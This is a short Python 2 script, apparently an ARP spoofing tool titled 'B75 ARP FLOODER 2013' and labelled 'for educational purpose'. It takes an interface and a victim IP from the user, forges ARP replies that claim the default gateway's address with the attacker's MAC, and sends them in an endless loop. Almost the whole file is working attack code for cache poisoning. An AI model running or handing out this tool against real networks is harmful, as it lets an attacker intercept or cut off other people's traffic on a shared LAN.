#!/usr/bin/env python

from scapy.all import *
from time import sleep
import time
import sys, os, re, commands

def title():
    if os.name == "posix":
        os.system("clear")
    else:
        os.system("cls")
    info = '''
          


                      ,----,      ,----,. 
                    .'   .`|    ,'   ,' | 
      ,---,.     .'   .'   ;  ,'   .'   | 
    ,'  .'  \  ,---, '    .',----.'    .' 
  ,---.' .' |  |   :     ./ |    |   .'   
  |   |  |: |  ;   | .'  /  :    :  |--,  
  :   :  :  /  `---' /  ;   :    |  ;.' \ 
  :   |    ;     /  ;  /    |    |      | 
  |   :     \   ;  /  /     `----'.'\   ; 
  |   |   . |  /  /  /        __  \  .  | 
  '   :  '; |./__;  /       /   /\/  /  : 
  |   |  | ; |   : /       / ,,/  ',-   . 
  |   :   /  ;   |/        \ ''\       ; 
  |   | ,'   `---'          \   \    .'   
  `----'                     `--`-,-'     

                          
                          B75 ARP FLOODER 2013
                          For educational purpose
                          https://github.com/b-bellecour
                          
                          Baptiste Bellecour
                          

        '''
    for i in info:
        print '\b%s' %(i),
        sys.stdout.flush()
        time.sleep(0.005)
    print "\n"

def arpflood():
    interface = raw_input("Input egress interface:")
    conf.iface = interface

    target = raw_input("Input target IP:")
    target = target
    
    arp_paket = ARP()
    
    # IP Gateway
    gw = commands.getoutput("ip route list | grep default").split()[2][0:]
    arp_paket.psrc = gw
    
    
    #IP Victim
    arp_paket.pdst = target
    
    #Mac
    mac = commands.getoutput("ifconfig eth0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'") 
    arp_paket.hwsrc = mac 
    
    sleep(3)
    print '================================================'
    print "[+] Interface              : " + interface
    print "[+] Gateway's IP Address   : " + gw
    print "[+] Your Mac Address       : " + mac
    print "[+] Target\'s IP Address   : " + target
    print '================================================'
    sleep(3)
    
    print '''
    ARP Flooding ...
    '''
    try:
        while 1:
            send(arp_paket, verbose=0)
            sleep(0.5)
    except:
        print 'Exception error'
    
if __name__ == '__main__':
    title()
    try:
        arpflood()
    except KeyBoardInterrupt:
        print 'KeyBoardInterrupt exception'


